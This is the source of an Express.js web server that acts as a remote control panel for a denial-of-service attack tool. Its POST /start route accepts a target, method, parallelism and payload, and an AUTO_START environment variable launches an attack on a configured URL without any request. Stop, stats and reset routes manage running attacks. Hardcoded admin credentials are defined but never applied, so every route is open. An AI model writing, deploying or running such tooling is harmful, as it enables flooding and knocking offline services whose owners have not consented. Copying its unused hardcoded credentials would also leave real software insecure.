const express = require('express');
const bodyParser = require('body-parser');
const dd = require('./lib/ddos');
const basicAuth = require('express-basic-auth')


const app = express();
app.use(bodyParser.urlencoded({extended: true}))
app.use(bodyParser.json())

const auth = basicAuth({
    users: {'admin': 'supersecret'},
    challenge: true,
})

const fs = require('fs');
const path = require('path');

app.get('/reset', (req, res, next) => {
    dd.resetState()
    res.json({msg: 'done'})
})

app.get('/stats', (req, res, next) => {
    try {
        const stats = dd.getStats();
        res.json({stats})
    } catch (e) {
        res.json({msg: e.message})
    }
})

app.get('/stop', (req, res, next) => {
    dd.stop();
    res.json({msg: 'done'})
})

app.post('/start', (req, res, next) => {
    const {target, method, parallel, payload,} = req.body;
    dd.setStuff(target, parallel, method, payload);
    dd.startAttack();
     res.status(200).send();
})

app.get('/', (req, res, next) => {
    return res.sendFile(path.join(__dirname, "vue.html"));
})

if (process.env.AUTO_START) {
    const url = process.env.URL
    const conn = process.env.CONNECTIONS
    dd.setStuff(url, conn);
    dd.startAttack();
}


module.exports = app;